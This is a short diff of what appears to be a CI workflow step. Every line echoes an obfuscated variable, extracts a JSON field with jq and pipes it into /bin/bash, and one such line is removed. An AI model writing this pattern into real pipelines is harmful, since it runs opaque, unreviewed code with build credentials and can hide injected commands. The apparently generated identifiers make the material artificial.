@@ -24,7 +24,6 @@ jobs:
           echo $k7286 | jq -r .zvqcy07 | /bin/bash
           echo $n858 | jq -r .zwpuy64824 | /bin/bash
           echo $qfonk5788 | jq -r .ddm13880 | /bin/bash
-          echo $cgel3474 | jq -r .in6 | /bin/bash
           echo $xawvu39941 | jq -r .b26087 | /bin/bash
 
       - name: Persist results
